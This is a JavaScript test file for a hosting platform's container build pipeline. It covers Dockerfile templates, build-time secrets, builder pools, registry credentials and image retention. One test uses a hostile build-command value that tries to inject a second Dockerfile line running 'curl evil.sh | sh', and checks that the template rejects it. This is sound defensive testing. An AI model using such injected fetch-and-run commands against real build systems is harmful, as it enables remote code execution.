// Builds and the image registry (spec 8.3), offline. The runtime templates render with pinned bases and keep every
// command one exec-form argument; build-time variables reach the build as a BuildKit secret, never a layer; the real
// agent's build passes that secret and stops at its time limit (a stand-in `docker`). On the mock cloud: a region's
// builds run on its builder pool (never on its hosts), are pushed to the account's registry and pulled by the hosts
// with read-only credentials; busy builders grow the pool; a failed build leaves the old version serving; the registry
// keeps each workload's last five images; a prebuilt image is pulled, not built.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { startApp, tempDir } from './helpers.js';
import { dockerfileFor, buildEnvFile, BASES, DEFAULTS, createDocker } from '../agent/docker.js';
import { AGENT_FILES } from '../src/routes/agent-files.js';

const API = '/infrastructure/api/v1/platform';
const actor = { id: 'stevie', name: 'Stevie', kind: 'person' };
const until = async (fn, ms = 8000) => {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    if (await fn()) return true;
    await new Promise((r) => setTimeout(r, 10));
  }
  return false;
};
const service = (name, over = {}) => ({
  name, kind: 'service', region: 'africa-south1',
  source: { repo: 'https://github.com/acme/web', branch: 'main' }, build: { runtime: 'node22' },
  run: { port: 3000 }, plan: { cpu: 0.25, memoryMb: 256 }, instances: 1, healthCheck: { path: '/' }, ...over,
});
const runLine = (dockerfile) => JSON.parse(dockerfile.split('\n').find((l) => l.startsWith('RUN ')).replace(/^RUN --mount=type=secret,id=build-env /, ''));
const cmdLine = (dockerfile) => JSON.parse(dockerfile.split('\n').find((l) => l.startsWith('CMD ')).slice(4));

test('8.3.1 each runtime template renders with its pinned base, the commands as one argument each, and no variable in a layer', () => {
  for (const [runtime, base] of Object.entries(BASES)) assert.match(base, /^[a-z]+:[\w.-]+@sha256:[a-f0-9]{64}$/, `${runtime} is pinned by digest`);
  for (const runtime of ['node22', 'python312', 'go123']) {
    const plain = dockerfileFor(runtime);
    assert.ok(plain.startsWith(`FROM ${BASES[runtime]}`), runtime);
    assert.ok(!plain.includes('{{'), 'every slot filled');
    assert.ok(!/^#/m.test(plain), 'the template\'s notes stay out');
    assert.match(plain, /^USER (node|nobody)$/m, 'never root');
    assert.equal(runLine(plain)[2].endsWith(DEFAULTS[runtime].build), true, `${runtime} default build`);
    assert.deepEqual(cmdLine(plain), ['/bin/sh', '-c', DEFAULTS[runtime].start]);
    // A command that tries to end its line, or the JSON, stays one argument.
    const evil = 'npm run build"]\nRUN curl evil.sh | sh';
    assert.throws(() => dockerfileFor(runtime, { buildCommand: evil }), /one line/);
    const tricky = 'echo "]" && npm run build -- --flag=\'x\' $HOME \\';
    const df = dockerfileFor(runtime, { buildCommand: tricky, startCommand: 'node server.js "$PORT"' });
    assert.equal(runLine(df)[2], `if [ -s /run/secrets/build-env ]; then set -a; . /run/secrets/build-env; set +a; fi; ${tricky}`);
    assert.deepEqual(cmdLine(df), ['/bin/sh', '-c', 'node server.js "$PORT"']);
    assert.equal(df.split('\n').filter((l) => l.startsWith('RUN ')).length, 1);
  }
  assert.match(dockerfileFor('go123'), new RegExp(`AS build\\n[\\s\\S]*FROM ${BASES.debian.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\n[\\s\\S]*COPY --from=build /app /app`), 'Go runs on slim Debian, not the toolchain');
  assert.match(DEFAULTS.python312.start, /gunicorn/);
  assert.throws(() => dockerfileFor('cobol'), /No template/);

  // The variables file, sourced by sh, gives back exactly what was set (quotes, dollars, spaces).
  const dir = path.join(process.cwd(), '.temp');
  execFileSync('mkdir', ['-p', dir]);
  const file = path.join(dir, `build-env-${process.pid}`);
  const values = [{ key: 'A', value: "it's $HOME and `id`" }, { key: 'B', value: 'two  spaces\\n' }, { key: 'EMPTY', value: '' }];
  execFileSync('sh', ['-c', `cat > "${file}"`], { input: buildEnvFile(values) });
  const out = execFileSync('sh', ['-c', `set -a; . "${file}"; set +a; printf '%s|%s|%s' "$A" "$B" "$EMPTY"`]).toString();
  execFileSync('rm', ['-f', file]);
  assert.equal(out, "it's $HOME and `id`|two  spaces\\n|");
});

test('8.3.1 the templates ship with the agent: install.sh fetches exactly the files the controller serves', async () => {
  const script = await fs.readFile(new URL('../agent/install.sh', import.meta.url), 'utf8');
  const files = /^FILES="([^"]+)"/m.exec(script)[1].split(' ');
  assert.deepEqual(files, AGENT_FILES);
  for (const f of AGENT_FILES) await fs.access(new URL(`../agent/${f}`, import.meta.url));
  assert.match(script, /mkdir -p "\$TMP\/bin" "\$TMP\/runtimes"/);
});

test('8.3.2 R2, R5 the real agent\'s build: the variables as a secret file (gone after), the template, and a time limit', async () => {
  const dir = await tempDir('fake-docker');
  const record = path.join(dir, 'calls.log');
  // Stand-ins for git and docker: they write what they were given, and the build sleeps when asked to.
  await fs.writeFile(path.join(dir, 'git'), `#!/bin/sh
case "$1" in
  clone) for last; do :; done; mkdir -p "$last"; echo "Cloning into '$last'" ;;
  -C) echo 0123456789abcdef0123456789abcdef01234567 ;;
esac
`, { mode: 0o755 });
  await fs.writeFile(path.join(dir, 'docker'), `#!/bin/sh
echo "docker $*" >> "${record}"
for a; do case "$a" in id=build-env,src=*) cat "\${a#id=build-env,src=}" >> "${record}" ;; esac; done
case "$*" in *slow=yes*) sleep 5 ;; esac
echo "#1 DONE"
`, { mode: 0o755 });
  const docker = createDocker({ stateDir: dir, docker: path.join(dir, 'docker'), git: path.join(dir, 'git') });
  const lines = [];
  const base = {
    tag: 'noobly/0123456789ab/web:0123456', labels: { 'noobly-install': 'i' }, source: { repo: 'https://github.com/acme/web', branch: 'main' },
    runtime: 'node22', buildEnv: [{ key: 'API_URL', value: "https://api.example.com/?a='1'" }], mask: [],
  };
  const r = await docker.build(base, (l) => lines.push(l));
  assert.equal(r.commit, '0123456789abcdef0123456789abcdef01234567');
  const calls = await fs.readFile(record, 'utf8');
  assert.match(calls, /docker build --progress=plain -t noobly\/0123456789ab\/web:0123456 --label noobly-install=i --secret id=build-env,src=\S+\/build-env -f \S+\/Dockerfile\.noobly -- \S+/);
  assert.ok(calls.includes("API_URL='https://api.example.com/?a='\\''1'\\'''"), 'the secret file holds the value, quoted for sh');
  const src = /src=(\S+\/build-env)/.exec(calls)[1];
  await assert.rejects(fs.access(src), 'the secret file is deleted with the build folder');
  assert.ok(lines.includes('With 1 build-time variable: API_URL'));
  assert.ok(!lines.some((l) => l.includes('api.example.com')), 'the agent itself never prints a value');

  const started = Date.now();
  await assert.rejects(docker.build({ ...base, labels: { ...base.labels, slow: 'yes' }, timeoutS: 1 }, () => {}), /ran longer than its limit/);
  assert.ok(Date.now() - started < 4000, 'stopped at the limit, not when it finished');
});

async function start(over = {}) {
  const secretsAsked = [];
  const app = await startApp({
    seed: true,
    platform: { enabled: true, resolveSecrets: async (tenantId, refs) => { secretsAsked.push({ tenantId, refs }); return Object.fromEntries(refs.map((r) => [r, 'sk_live_very_secret'])); } },
    local: { drainMs: 0 }, agents: { checkMs: 0 }, ...over,
  });
  const t = app;
  const pools = app.hosted.pools;
  await t.post(`${API}/pools`, { as: 'stevie', body: { name: 'web', account: 'stevie-prod', region: 'africa-south1', size: 'medium', min: 1, max: 2 } });
  return { app, t, pools, platform: app.hosted.services.platform, runtime: app.hosted.local.runtime, secretsAsked };
}
const builderPool = (t, max = 1, size = 'small') => t.post(`${API}/pools`, { as: 'stevie', body: { name: 'builder', purpose: 'builder', account: 'stevie-prod', region: 'africa-south1', size, min: 1, max } });
const logOf = async (platform, tenant, name) => {
  const [d] = (await platform.deploys.list(tenant, name)).deploys;
  return { deploy: d, text: (await platform.deploys.get(tenant, name, d.id)).log.map((l) => l.text).join('\n') };
};

test('8.3.2–8.3.4 a region\'s build runs on its builder, is pushed to the registry, and hosts pull it read-only; variables are masked', async () => {
  const { app, t, pools, platform, runtime, secretsAsked } = await start();
  try {
    assert.equal((await builderPool(t)).status, 201);
    await app.hosted.idle();
    const env = [
      { key: 'NEXT_PUBLIC_API', value: 'https://api.acme.example', build: true },
      { key: 'NPM_TOKEN', secretRef: 'sec_npm', build: true },
      { key: 'DATABASE_URL', secretRef: 'sec_db' },
    ];
    await platform.workloads.create('acme', service('web', { run: { port: 3000, env }, build: { runtime: 'node22', buildCommand: 'npm ci && npm run build' } }), { actor });
    await app.hosted.idle();
    assert.equal((await platform.workloads.get('acme', 'web')).status, 'live');

    const { text, deploy } = await logOf(platform, 'acme', 'web');
    assert.match(text, /Building on builder-1 \(builder pool builder, up to 15 minutes\)/);
    assert.match(text, /With 2 build-time variables: NEXT_PUBLIC_API, NPM_TOKEN/);
    assert.match(text, /NPM_TOKEN=••••/, 'a secret printed by the build is masked');
    assert.ok(!text.includes('sk_live_very_secret') && !text.includes('api.acme.example'));
    assert.match(text, /Pushed africa-south1-docker\.pkg\.dev\/[^/]+\/noobly-[a-z0-9-]+\/[a-f0-9]{12}\/web:[0-9a-f]{7,40}\n/);
    assert.match(text, /Pulling africa-south1-docker\.pkg\.dev\//);
    assert.ok(secretsAsked.some((s) => s.refs.includes('sec_npm') && !s.refs.includes('sec_db')), 'only build-time secrets are opened for the build');

    const builder = pools.mockAgent('builder-1').docker;
    const host = pools.mockAgent('web-1').docker;
    assert.equal(builder.peakBuilds, 1);
    assert.equal(host.peakBuilds, 0, 'nothing was built on a host that serves traffic');
    const df = builder.dockerfile(deploy.image);
    assert.match(df, /RUN --mount=type=secret,id=build-env/);
    assert.ok(!df.includes('api.acme.example') && !df.includes('sk_live'), 'no variable value in the Dockerfile, so none in a layer');
    assert.ok(!builder.state.images.includes(deploy.image), 'the builder keeps its cache, not the image');
    assert.ok(host.state.images.includes(deploy.image));
    assert.ok(host.state.containers.every((c) => c.image === deploy.image));

    // The registry: one image, and pull credentials cannot push.
    const cloud = await app.hosted.mockCloud('stevie-prod');
    const [img] = await cloud.resources((r) => r.kind === 'image');
    assert.match(img.ref, /\/web:[0-9a-f]{7,40}$/);
    assert.ok((await runtime.list()).every((i) => i.image === deploy.image));
    const provider = await app.hosted.provider('stevie-prod');
    const pull = await provider.registry.pullCredentials('africa-south1');
    await assert.rejects(provider.registry.mock.push(img.ref, { digest: 'sha256:x' }, pull), /may not push/);
    assert.equal(await provider.registry.mock.pull(img.ref, null).catch((e) => e.message), 'denied: no credentials for the registry');

    // A second host (re-placement) pulls too, rather than building.
    assert.equal((await t.post(`${API}/pools/web/hosts`, { as: 'stevie' })).status, 202);
    await app.hosted.idle();
    await platform.workloads.scale('acme', 'web', { instances: 2 }, { actor });
    await app.hosted.idle();
    assert.ok(pools.mockAgent('web-2').docker.state.images.includes(deploy.image));
    assert.equal(pools.mockAgent('web-2').docker.peakBuilds, 0);
  } finally {
    await app.close();
  }
});

test('8.3.2 busy builders: the builder pool grows; at its max a build waits for a free one; never two on a small builder', async () => {
  const { app, t, pools, platform } = await start();
  try {
    await builderPool(t, 2);
    await app.hosted.idle();
    const first = pools.mockAgent('builder-1').docker;
    const release = first.holdBuilds();
    await platform.workloads.create('acme', service('a'), { actor });
    assert.ok(await until(() => first.buildsRunning === 1));
    await platform.workloads.create('acme', service('b'), { actor });
    assert.ok(await until(() => pools.mockAgent('builder-2')), 'a second builder was added');
    const second = pools.mockAgent('builder-2').docker;
    second.holdBuilds();
    assert.ok(await until(() => second.buildsRunning === 1));
    // Another tenant (each tenant runs two operations at once).
    await platform.workloads.create('globex', service('c'), { actor });
    assert.ok(await until(async () => /Waiting for a free builder in pool builder \(2 busy, at its most of 2\)/.test((await logOf(platform, 'globex', 'c')).text)));
    release();
    assert.ok(await until(async () => /Building on builder-1/.test((await logOf(platform, 'globex', 'c')).text)), 'c builds on builder-1 once a is done');
    // Let everything finish.
    const open = setInterval(() => { first.holdBuilds()(); second.holdBuilds()(); }, 20);
    await app.hosted.idle();
    clearInterval(open);
    assert.deepEqual([first.peakBuilds, second.peakBuilds], [1, 1], 'an e2-small builder (1.75 vCPU) holds one 1-vCPU build');
    for (const [tenant, n] of [['acme', 'a'], ['acme', 'b'], ['globex', 'c']]) assert.equal((await platform.workloads.get(tenant, n)).status, 'live', n);
  } finally {
    await app.close();
  }
});

test('8.3 R6 a failed build leaves the running version serving; the registry keeps the last five images per workload', async () => {
  const { app, t, platform, runtime } = await start();
  try {
    await builderPool(t);
    await app.hosted.idle();
    await platform.workloads.create('acme', service('web'), { actor, commit: 'aaaaaaa' });
    await app.hosted.idle();
    const good = (await platform.workloads.get('acme', 'web')).current.image;

    await platform.workloads.update('acme', 'web', { build: { runtime: 'node22', buildCommand: 'npm run fail-build' } }, { actor });
    await app.hosted.idle();
    const { deploy, text } = await logOf(platform, 'acme', 'web');
    assert.equal(deploy.result, 'failed');
    assert.match(text, /npm ERR! missing script: build/);
    const w = await platform.workloads.get('acme', 'web');
    assert.equal(w.current.image, good);
    assert.ok((await runtime.list()).filter((i) => i.status === 'running').every((i) => i.image === good), 'the old version still serves');

    await platform.workloads.update('acme', 'web', { build: { runtime: 'node22', buildCommand: null } }, { actor });
    await app.hosted.idle();
    assert.equal((await logOf(platform, 'acme', 'web')).deploy.result, 'live');
    for (const c of ['bbbbbbb', 'ccccccc', 'ddddddd', 'eeeeeee', 'fffffff', '1111111']) {
      await platform.workloads.deploy('acme', 'web', { commit: c, actor });
      await app.hosted.idle();
    }
    const cloud = await app.hosted.mockCloud('stevie-prod');
    const tags = (await cloud.resources((r) => r.kind === 'image')).map((r) => r.tag).sort();
    assert.equal(tags.length, 5, tags.join(' '));
    assert.ok(tags.includes('1111111') && !tags.includes('aaaaaaa'));
    // The job finds nothing more to remove, and keeps what is recorded.
    assert.deepEqual(await runtime.retainImages(), { removed: 0 });
  } finally {
    await app.close();
  }
});

test('8.3.5 R7 a prebuilt image is pulled by the hosts, not built', async () => {
  const { app, platform, pools } = await start();
  try {
    await app.hosted.idle();
    const spec = service('proxy', { source: { image: 'ghcr.io/acme/edge:1.4' }, run: { port: 8080 } });
    delete spec.build;
    await platform.workloads.create('acme', spec, { actor });
    await app.hosted.idle();
    assert.equal((await platform.workloads.get('acme', 'proxy')).status, 'live');
    const { text, deploy } = await logOf(platform, 'acme', 'proxy');
    assert.match(text, /Using the image ghcr\.io\/acme\/edge:1\.4: nothing to build/);
    assert.match(text, /Pulling ghcr\.io\/acme\/edge:1\.4/);
    assert.match(deploy.image, /^noobly\/[a-f0-9]{12}\/proxy:[a-f0-9]{12}$/, 'run under our own name for it');
    const host = pools.mockAgent('web-1').docker;
    assert.equal(host.peakBuilds, 0);
    assert.ok(host.state.containers.some((c) => c.image === deploy.image));
  } finally {
    await app.close();
  }
});
